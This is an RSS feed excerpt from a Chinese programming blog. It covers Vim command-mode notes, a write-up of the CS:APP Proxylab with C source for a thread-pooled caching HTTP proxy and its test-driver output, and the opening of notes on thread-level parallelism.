&lt;p&gt;Normal模式下输入&lt;code&gt;:&lt;/code&gt;,进入Command模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:w&lt;/code&gt;: 保存文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:q&lt;/code&gt;: 退出&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:wq&lt;/code&gt;: 保存并退出&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:h {command}&lt;/code&gt;: 显示关于命令的帮助(VScode Vim不支持)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Esc&amp;gt;&lt;/code&gt;: 回到Normal模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Ex命令格式&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;:[range] {excommand} [args]&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;range&lt;/code&gt;: 作用的范围,默认本行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;excommand&lt;/code&gt;: 使用于Command模式下的特殊命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: 后续的参数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一些Ex Command(&lt;code&gt;[x]&lt;/code&gt;是寄存器,是可选项):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:[range] d [x]&lt;/code&gt;: 删除range中的行到寄存器x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] y [x]&lt;/code&gt;: 复制range中的行到寄存器x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] p&lt;/code&gt;: 打印range中的行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;code&gt;range&lt;/code&gt;与address:指定范围&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;range&lt;/code&gt;由一个或两个address构成,即&lt;code&gt;{address}&lt;/code&gt; 或 &lt;code&gt;{address},{address}&lt;/code&gt;
address可以是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;{lineno}&lt;/code&gt;: 行号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt;: 最后一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;:光标当前行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/{pattern}&lt;/code&gt;: 下一个&lt;code&gt;pattern&lt;/code&gt;所在行
address可以做加减法,如 &lt;code&gt;.+3&lt;/code&gt;表示光标往下第3行, &lt;code&gt;$-3&lt;/code&gt;表示倒数第4行.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: 当前文件所有行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#39;&amp;lt;&lt;/code&gt; / &lt;code&gt;&amp;#39;&amp;gt;&lt;/code&gt;: Visual模式中选中的开头和结尾&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;行的复制/移动/粘贴&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:[range] copy {address}&lt;/code&gt;: 把range中的行复制到address后面&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] move {address}&lt;/code&gt;: 把range中的行移动到address后面&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[address] put [x]&lt;/code&gt;: 把寄存器x中的内容粘贴到address后面&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;批量操作:normal命令&lt;/h2&gt;
&lt;p&gt;格式: &lt;code&gt;:[range] normal {commands}&lt;/code&gt;
含义:对range中所有行执行Normal 模式下的命令commands
小技巧:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;range为%,可以对所有行执行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] normal .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[range] normal @{register}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;批量操作:global命令&lt;/h2&gt;
&lt;p&gt;格式: &lt;code&gt;:[range] global/pattern/[excmd]&lt;/code&gt;
含义: 对range中包含pattern的所有行执行Command模式下的e命令
&lt;code&gt;[excmd]&lt;/code&gt;:Ex命令,默认为打印(print)
&lt;code&gt;:[range] global/{pattern}/normal {commands}&lt;/code&gt;:
对range中所有符合pttern的行,执行Normal模式下的命令commands
例如:&lt;code&gt;:% global/TODO/normal @x&lt;/code&gt; 即对所有TODO行执行寄存器x录制的宏.&lt;/p&gt;
&lt;h2&gt;替换命令&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;:[range]s/{pattern}/{string}/[flags]&lt;/code&gt;
讲pattern替换为string
flags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;g&lt;/code&gt;: 替换每一行的所有匹配&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i&lt;/code&gt;: 忽视大小写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt;: 替换前确认&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt;: 计数而不是替换&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Visual模式&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Normal模式下按&lt;code&gt;v&lt;/code&gt;进入visual 模式&lt;/li&gt;
&lt;li&gt;用移动命令选择文本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;x/y&lt;/code&gt;: 剪切/复制文本,回到Normal模式下&lt;code&gt;p&lt;/code&gt;粘贴&lt;/li&gt;
&lt;li&gt;Normal模式下按&lt;code&gt;V&lt;/code&gt;进入visual line 模式,一次选中一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;Esc&amp;gt;&lt;/code&gt;: 回到Normal模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;寄存器与宏&lt;/h1&gt;
&lt;h2&gt;寄存器&lt;/h2&gt;
&lt;p&gt;一个字符对应一个寄存器
特殊的寄存器:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;: 默认寄存器&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;: 当前文件名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;: 上一次插入的内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:&lt;/code&gt;: 上一次执行的命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;: 系统剪切板&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;:reg {register}&lt;/code&gt;查看
指定寄存器:
在复制/删除/粘贴等操作前加上 &lt;code&gt;&amp;quot;{register}&lt;/code&gt;可以指定寄存器
如&lt;code&gt;&amp;quot;+p&lt;/code&gt;复制系统剪切板的内容.
想要持久保存的文本放入指定的寄存器,避免被覆盖.
寄存器字符大写:添加到原来内容的后面而非覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;宏&lt;/h2&gt;
&lt;p&gt;录制一系列键盘操作,并允许重放这些操作.
操作系列存储在指定的寄存器中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;q{register}&lt;/code&gt;: 开始录制宏,并存放在指定寄存器中&lt;/li&gt;
&lt;li&gt;录制过程中,按&lt;code&gt;q&lt;/code&gt;退出录制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@{register}&lt;/code&gt;: 重放寄存器中的操作&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@&lt;/code&gt;: 重放上一次宏操作&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 16 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Proxylab</title><link>https://tankimzeg.top/blog/csapp/proxylab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/proxylab/</guid><description>Proxylab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/proxylab/&quot;&gt;https://tankimzeg.top/blog/csapp/proxylab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;入手准备&lt;/h1&gt;
&lt;p&gt;在这个实验中,我将动手写一个Web代理服务器.对于身处中国大陆并且学习过计算机网络的我来说,代理服务器的原理并不复杂.
本实验分为三个部分:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实现顺序代理服务器&lt;/li&gt;
&lt;li&gt;处理并发请求&lt;/li&gt;
&lt;li&gt;缓存Web页面&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;./driver.sh文件提供了自动测试的功能,但首先要确保安装了依赖工具:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt upgrade 
sudo apt install net-tools
sudo apt install curl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tiny文件夹下是CS:APP课程的一个简单Web服务器示例.利用它可以进行简单的调试.
在15214端口启动tiny server:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./tiny 15214
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后使用&lt;code&gt;telnet&lt;/code&gt;工具发送请求:&lt;code&gt;telnet localhost 15214&lt;/code&gt;
&lt;code&gt;GET /home.html HTTP/1.0&lt;/code&gt;
能得到如下反响:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250213164706.png&quot; alt=&quot;&quot;&gt;
Writeup提示我,不应让服务器轻易崩溃,所以我注释掉csapp.h文件的&lt;code&gt;unix_error&lt;/code&gt;函数声明,在proxy.c文件中重载为stactic类型,这个奇思妙想解决了这个问题.
Writeup还提到了:your proxy must ignore SIGPIPE signals and should deal gracefully with write operations that return EPIPE errors.
不是很懂,暂时不管.&lt;/p&gt;
&lt;h1&gt;Part I:实现顺序Web代理服务器&lt;/h1&gt;
&lt;p&gt;HTTP请求有多种,本实验只要求处理GET HTTP/1.0请求.
Writeup提到了,在浏览器地址栏中输入URL如 &lt;a href=&quot;http://www.cmu.edu/hub/index.html&quot;&gt;http://www.cmu.edu/hub/index.html&lt;/a&gt;
会向代理服务器发送如下请求行:
&lt;code&gt;GET  http://www.cmu.edu/hub/index.html HTTP/1.1&lt;/code&gt;
我需要转换成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET  /hub/index.html HTTP/1.0
Host: www.cmu.edu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3
Connection: close
Proxy-Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其他请求头不变.
我第一次使用csapp.c封装的I/O函数,由于不熟悉减慢了一些速度.好在不难理解.
对原始URI 的分割和讨论挺烦的,没用上正则表达式.&lt;/p&gt;
&lt;p&gt;记录一下主函数,我借鉴了tiny服务器的设计,可以看到非常简洁:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main(int argc, char **argv)
{
    int listenfd, connfd;
    char hostname[MAXLINE], port[MAXLINE];
    socklen_t clientlen;
    struct sockaddr_storage clientaddr;
    if(argc!=2){
        printf(&amp;quot;Usage: %s &amp;lt;port&amp;gt;\n&amp;quot;,argv[0]);
        return 0;
    }
    listenfd = Open_listenfd(argv[1]);
    while(1){
    clientlen = sizeof(clientaddr);
    connfd = Accept(listenfd, (SA *)&amp;amp;clientaddr, &amp;amp;clientlen);
    Getnameinfo((SA *) &amp;amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, 0);
    printf(&amp;quot;Accepted connection from (%s, %s)\n&amp;quot;, hostname, port);
    proxy(connfd);
    Close(connfd);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;proxy&lt;/code&gt;函数也具有较好可读性:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void proxy(int connfd){
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];
    char serv_req[MAXLINE];
    rio_t rio;
  
    Rio_readinitb(&amp;amp;rio,connfd);
    if(!Rio_readlineb(&amp;amp;rio,buf,MAXLINE)) return;
    fprintf(stdout,&amp;quot;%s&amp;quot;,buf);
    sscanf(buf,&amp;quot;%s %s %s&amp;quot;,method,uri,version);
    if(strcasecmp(method,&amp;quot;GET&amp;quot;)){
        unix_error(&amp;quot;Proxy server does not implement this method&amp;quot;);
        return ;
    }
    URI *uri_data = (URI *)malloc(sizeof(URI));
    parse_uri(uri_data,uri);
    int serverfd = Open_clientfd(uri_data-&amp;gt;host,uri_data-&amp;gt;port);
    sprintf(serv_req,&amp;quot;GET %s HTTP/1.0\r\nHost: %s\r\n&amp;quot;,uri_data-&amp;gt;path,version,uri_data-&amp;gt;host);;
    printf(&amp;quot;%s\n&amp;quot;,serv_req);
    Rio_writen(serverfd,serv_req,strlen(serv_req));
    readDeal_hdrs(serverfd,&amp;amp;rio);
    writeback_response(serverfd,connfd);
    Close(serverfd);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;测试结果&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./driver
*** Basic ***
Starting tiny on 4663
Starting proxy on 27345
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy
   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过!&lt;/p&gt;
&lt;h1&gt;Part II:处理并发请求&lt;/h1&gt;
&lt;p&gt;我已经体验过基于进程的并发了,这次,我决定实现线程池技术实现并发.
回顾[[同步#生产者-消费者问题]],我们需要维护一个线程池.
我创建了sbuf.h和sbuf.c文件,并修改Makefile.
没学过CMake,但是照猫画虎:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cmake&quot;&gt;sbuf.o: sbuf.c sbuf.h
    $(CC) $(CFLAGS) -c sbuf.c
  
proxy: proxy.o csapp.o sbuf.o
    $(CC) $(CFLAGS) proxy.o csapp.o sbuf.o -o proxy $(LDFLAGS)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后,查看CS:APP课本(好像是690多页)的代码,稍作修改,非常轻松就实现了线程池并发.&lt;/p&gt;
&lt;h2&gt;留一份完整代码:&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/proxylab/proxy.c&quot;&gt;proxy.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;  
#include &amp;quot;csapp.h&amp;quot;  
#include &amp;quot;sbuf.h&amp;quot;  
/* Recommended max cache and object sizes */  
#define MAX_CACHE_SIZE 1049000  
#define MAX_OBJECT_SIZE 102400  
  
typedef struct {  
    char host[MAXLINE];  
    char port[MAXLINE];  
    char path[MAXLINE];  
}URI;  
  
/* You won&amp;#39;t lose style points for including this long line in your code */  
static const char *user_agent_hdr = &amp;quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&amp;quot;;  
  
  
/* Reload unix_error function to avoid exit */  
static void unix_error(char *msg);  
  
/* share buf */  
sbuf_t sbuf;  
#define SBUFSIZE 20    // sbuf/线程池的大小  
#define NTHREADS 4  // 4个线程  
  
  
/* the proxy server */  
int parse_uri(URI *rebuild_uri,char raw_uri[MAXLINE]){  
    char *hostptr = strstr(raw_uri,&amp;quot;://&amp;quot;);  
    char *pathptr = NULL;  
    char *portptr = NULL;  
    if(!hostptr){// 不以 http:// 形式请求  
        rebuild_uri-&amp;gt;host[0] = 0;  
        strcpy(rebuild_uri-&amp;gt;port,&amp;quot;80&amp;quot;);  
        if(pathptr = strstr(raw_uri,&amp;quot;/&amp;quot;))  
            strcpy(rebuild_uri-&amp;gt;path,pathptr);  
        return 1;  
    }  
    else{  
        portptr = strstr(hostptr+3,&amp;quot;:&amp;quot;);  
        if(portptr){  
            int port;  
            sscanf(portptr+1,&amp;quot;%d%s&amp;quot;,&amp;amp;port,rebuild_uri-&amp;gt;path);  
            sprintf(rebuild_uri-&amp;gt;port,&amp;quot;%d&amp;quot;,port);  
            *portptr = 0;  
        }  
        else{  
            pathptr = strstr(hostptr+3,&amp;quot;/&amp;quot;);  
            strcpy(rebuild_uri-&amp;gt;path,pathptr);  
            *pathptr = 0;  
                    }  
        strcpy(rebuild_uri-&amp;gt;host,hostptr+3);  
    }  
    return 2;  
}  
void readDeal_hdrs(int sendfd,rio_t *rp){ // 发送请求头  
    char buf[MAXLINE];  
    sprintf(buf,&amp;quot;%sConnection: close\r\nProxy-Connection: close\r\n&amp;quot;,user_agent_hdr);  
    Rio_writen(sendfd,buf,strlen(buf));  
    /* 保留其他头部信息 */  
    for(Rio_readlineb(rp,buf,MAXLINE);strcmp(buf,&amp;quot;\r\n&amp;quot;);Rio_readlineb(rp,buf,MAXLINE)){  
        if(!strncmp(buf,&amp;quot;Host:&amp;quot;,5) || !strncmp(buf,&amp;quot;Connection:&amp;quot;,11) ||  
            !strncmp(buf,&amp;quot;User-Agent:&amp;quot;,11) || !strncmp(buf,&amp;quot;Proxy-Connection:&amp;quot;,17))  
            continue;  
        else  
            Rio_writen(sendfd,buf,strlen(buf));  
        printf(&amp;quot;%s\n&amp;quot;,buf);  
    }  
    Rio_writen(sendfd,buf,strlen(buf));  
  
}  
void writeback_response(int servfd,int clientfd){  
    rio_t rio;  
    int n;  
    char buf[MAXLINE];  
    Rio_readinitb(&amp;amp;rio,servfd);  
    while(n=Rio_readlineb(&amp;amp;rio,buf,MAXLINE))  
        Rio_writen(clientfd,buf,n);  
    }  
void proxy(int connfd){  
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];  
    char serv_req[MAXLINE];  
    rio_t rio;  
  
    Rio_readinitb(&amp;amp;rio,connfd);  
    if(!Rio_readlineb(&amp;amp;rio,buf,MAXLINE)) return;  
    fprintf(stdout,&amp;quot;%s&amp;quot;,buf);  
    sscanf(buf,&amp;quot;%s %s %s&amp;quot;,method,uri,version);  
    if(strcasecmp(method,&amp;quot;GET&amp;quot;)){  
        unix_error(&amp;quot;Proxy server does not implement this method&amp;quot;);  
        return ;  
    }  
    URI *uri_data = (URI *)malloc(sizeof(URI));  
    parse_uri(uri_data,uri);  
    int serverfd = Open_clientfd(uri_data-&amp;gt;host,uri_data-&amp;gt;port);  
    sprintf(serv_req,&amp;quot;GET %s HTTP/1.0\r\nHost: %s\r\n&amp;quot;,uri_data-&amp;gt;path,uri_data-&amp;gt;host);;  
    printf(&amp;quot;%s\n&amp;quot;,serv_req);  
    Rio_writen(serverfd,serv_req,strlen(serv_req));  
    readDeal_hdrs(serverfd,&amp;amp;rio);  
    writeback_response(serverfd,connfd);  
    Close(serverfd);  
}  
/* thread */  
void *thread(void *vargp){  
    Pthread_detach(pthread_self());  
    int connfd;  
    while(1){  
    connfd = sbuf_remove(&amp;amp;sbuf);  
    proxy(connfd);  
    Close(connfd);  
    }  
}  
  
int main(int argc, char **argv)  
{  
    int listenfd, connfd;  
    char hostname[MAXLINE], port[MAXLINE];  
    socklen_t clientlen;  
    struct sockaddr_storage clientaddr;  
    pthread_t tid;  
        if(argc!=2){  
        printf(&amp;quot;Usage: %s &amp;lt;port&amp;gt;\n&amp;quot;,argv[0]);  
        return 0;  
    }  
    listenfd = Open_listenfd(argv[1]);  
    sbuf_init(&amp;amp;sbuf,SBUFSIZE);  
  
    for(int i=0;i&amp;lt;NTHREADS;i++){ // 创建几个并发线程  
        Pthread_create(&amp;amp;tid,NULL,thread,NULL);  
    }  
    while(1){  
    clientlen = sizeof(clientaddr);  
    connfd = Accept(listenfd, (SA *)&amp;amp;clientaddr, &amp;amp;clientlen);  
    Getnameinfo((SA *) &amp;amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, 0);  
    printf(&amp;quot;Accepted connection from (%s, %s)\n&amp;quot;, hostname, port);  
    sbuf_insert(&amp;amp;sbuf, connfd);  
    }  
    return 0;  
}  

static void unix_error(char *msg){  
    fprintf(stderr, &amp;quot;%s\n&amp;quot;,msg);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;测试结果&lt;/h2&gt;
&lt;p&gt;初次测试,报错:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;*** Concurrency ***
Starting tiny on port 30981
Starting proxy on port 15708
Starting the blocking NOP server on port 19519
Timeout waiting for the server to grab the port reserved for it
Terminated
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;每次出错,后台总会有遗留的僵尸进程,要一个一个kill掉...😅&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;查看./driver.sh脚本,发现第298~302行附近:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;# Run a special blocking nop-server that never responds to requests
nop_port=$(free_port)
echo &amp;quot;Starting the blocking NOP server on port ${nop_port}&amp;quot;
./nop-server.py ${nop_port} &amp;amp;&amp;gt; /dev/null &amp;amp;
nop_pid=$!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Python脚本哪里能直接当可执行文件?这是Python2时代是这样的吗?我记得之前哪个实验也是这个问题.
改为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;python3 ./nop-server.py ${nop_port} &amp;amp;&amp;gt; /dev/null &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;果然成功了!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./driver.sh
*** Basic ***
Starting tiny on 24188
Starting proxy on 13850
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy
   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40

*** Concurrency ***
Starting tiny on port 10579
Starting proxy on port 6922
Starting the blocking NOP server on port 3642
Trying to fetch a file from the blocking nop-server
Fetching ./tiny/home.html into ./.noproxy directly from Tiny
Fetching ./tiny/home.html into ./.proxy using the proxy
Checking whether the proxy fetch succeeded
Success: Was able to fetch tiny/home.html from the proxy.
Killing tiny, proxy, and nop-server
concurrencyScore: 15/15
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Part III:Web缓存&lt;/h1&gt;
&lt;p&gt;给最近使用的页面增加一层缓存.HTTP实际上定义了复杂的缓存模型.但实验将采用简化的方法.我也知道,如果页面缓存超过一定时间,页面可能发生了变化,显然应该把它移除缓存,但本实验没有考虑这一点,仅仅是简单的LRU缓存替换策略.
给缓存采取限制:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最大缓存大小:1MB&lt;/li&gt;
&lt;li&gt;最大缓存页面大小:100KB&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;说起Cache,应该是让我设计固定大小的缓存块,不是像Malloclab那样的碎片.也就是说,固定有10个页面缓存.
回顾[[Cachelab]]的代码,我设计出相似的数据结构.&lt;/p&gt;
&lt;p&gt;如果缓存命中,将命中的页面的timestamp设置为0,其他所有页面加1;如果缓存不命中,获取该页面,寻找空闲页面填入(如果没有空闲页面,寻找timestamp最大的页面替换),将其他所有页面加1.&lt;/p&gt;
&lt;p&gt;我通过&lt;code&gt;man 3 sprintf&lt;/code&gt;了解到,目前&lt;code&gt;sprintf&lt;/code&gt;已经是线程安全函数.&lt;/p&gt;
&lt;h2&gt;测试结果&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./driver.sh
gcc -g -Wall proxy.o csapp.o sbuf.o -o proxy -lpthread
*** Basic ***
Starting tiny on 11304
Starting proxy on 25852
1: home.html
   Fetching ./tiny/home.html into ./.proxy using the proxy
   Fetching ./tiny/home.html into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
2: csapp.c
   Fetching ./tiny/csapp.c into ./.proxy using the proxy   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
3: tiny.c
   Fetching ./tiny/tiny.c into ./.proxy using the proxy
   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
4: godzilla.jpg
   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy
   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
5: tiny
   Fetching ./tiny/tiny into ./.proxy using the proxy
   Fetching ./tiny/tiny into ./.noproxy directly from Tiny
   Comparing the two files
   Success: Files are identical.
Killing tiny and proxy
basicScore: 40/40

*** Concurrency ***
Starting tiny on port 24301
Starting proxy on port 7349
Starting the blocking NOP server on port 27021
Trying to fetch a file from the blocking nop-server
Fetching ./tiny/home.html into ./.noproxy directly from Tiny
Fetching ./tiny/home.html into ./.proxy using the proxy
Checking whether the proxy fetch succeeded
Success: Was able to fetch tiny/home.html from the proxy.
Killing tiny, proxy, and nop-server
concurrencyScore: 15/15

*** Cache ***
Starting tiny on port 3492
Starting proxy on port 12373
Fetching ./tiny/tiny.c into ./.proxy using the proxy
Fetching ./tiny/home.html into ./.proxy using the proxy
Fetching ./tiny/csapp.c into ./.proxy using the proxy
Killing tiny
Fetching a cached copy of ./tiny/home.html into ./.noproxy
Success: Was able to fetch tiny/home.html from the cache.
Killing proxy
cacheScore: 15/15

totalScore: 70/70
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过所有测试!&lt;/p&gt;
&lt;h1&gt;在浏览器中使用&lt;/h1&gt;
&lt;p&gt;只支持HTTP/1.0的GET请求对于现代网站来说太局限了.不过,我可以访问localhost的tiny服务器:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214001902.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214002220.png&quot; alt=&quot;&quot;&gt;
通过代理服务器,可以翻越GFW,自由之道,蕴于其中.亲自实现这个代理服务器,我还是深有感触的.
本实验比较简单而且我也有计算机网络和网络编程基础,所以我只用了1天时间就完成了.&lt;/p&gt;
&lt;p&gt;至此, CMU CS15-213的所有实验已经顺利完成!
完善收尾工作后,我会将所有实验代码,Markdown笔记上传到Github,供有缘人学习参考!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 12 Feb 2025 16:00:00 GMT</pubDate></item><item><title>线程级并行</title><link>https://tankimzeg.top/blog/csapp/thread-level-parallelism/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/thread-level-parallelism/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/thread-level-parallelism/&quot;&gt;https://tankimzeg.top/blog/csapp/thread-level-parallelism/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;并行计算硬件&lt;/h1&gt;
&lt;p&gt;经典的多核处理器:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214094826.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;乱序处理器结构:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214095029.png&quot; alt=&quot;&quot;&gt;
超线程的基本思想是,90%的程序没有完全利用这些功能单元.特别是因为缓存缺失而造成阻塞时,所有这些算术单元都处于空闲状态.
将寄存器,操作指令队列,程序计数器等翻倍,这样就能让多个线程运行起来,但共享功能单元.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214095608.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;线程级并行&lt;/h1&gt;
&lt;h2&gt;将程序分割成多个独立的任务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;例1:并行求和
  $\sum_{i=0}^{n-1}i=0+1+2+\dots+()n-1)$
